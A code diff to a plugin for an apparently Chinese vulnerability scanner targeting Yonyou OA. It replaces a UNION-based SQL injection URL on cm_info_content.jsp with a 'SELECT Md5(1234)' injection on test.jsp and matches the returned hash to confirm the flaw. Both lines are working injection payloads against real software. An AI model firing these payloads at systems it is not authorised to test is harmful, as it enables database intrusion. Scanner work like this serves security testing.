@@ -11,10 +11,10 @@ class VulnerabilityInfo(object):
         self.info['author'] = "Ascotbe"  # 插件作者
         self.info['create_date'] = "2019-10-13"  # 插件编辑时间
         self.info['disclosure']='2019-10-13'#漏洞披露时间，如果不知道就写编写插件的时间
-        self.info['algroup'] = "Seeyou_cm_info_content_sqli"  # 插件名称
+        self.info['algroup'] = "Seeyou_test_sqli"  # 插件名称
         self.info['name'] ='' #漏洞名称
         self.info['affects'] = "用友OA"  # 漏洞组件
-        self.info['desc_content'] = "用友OA_cm_info_content_sqli存在sql注入漏洞"  # 漏洞描述
+        self.info['desc_content'] = "用友OA_test文件sql注入漏洞"  # 漏洞描述
         self.info['rank'] = "高危"  # 漏洞等级
         self.info['suggest'] = "尽快升级最新系统"  # 修复建议
         self.info['details'] = Medusa  # 结果
@@ -25,7 +25,7 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-payload = "/R9iPortal/cm/cm_info_content.jsp?info_id=-12/**/UnIoN/**/AlL/**/SeLeCt/**/67,67,ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@version,67,67,67,67,67,67,67,67,67,67,67--"
+payload = "/yyoa/common/js/menu/test.jsp?doType=101&S1=SeLeCt%20Md5(1234)"
 def medusa(Url,RandomAgent,ProxyIp):
 
     scheme, url, port = UrlProcessing(Url)
@@ -55,12 +55,12 @@ def medusa(Url,RandomAgent,ProxyIp):
             resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
         con = resp.text
         code = resp.status_code
-        if  con.lower().find('bbbmicrosoft')!=-1:
-            Medusa = "{} \r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
+        if  con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
+            Medusa = "{}存在用友OA_test文件sql注入漏洞 \r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
             _t = VulnerabilityInfo(Medusa)
             web = ClassCongregation.VulnerabilityDetails(_t.info)
             web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
-            return (_t.info)
+            return (str(_t.info))
     except:
         _ = VulnerabilityInfo('').info.get('algroup')
         _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类
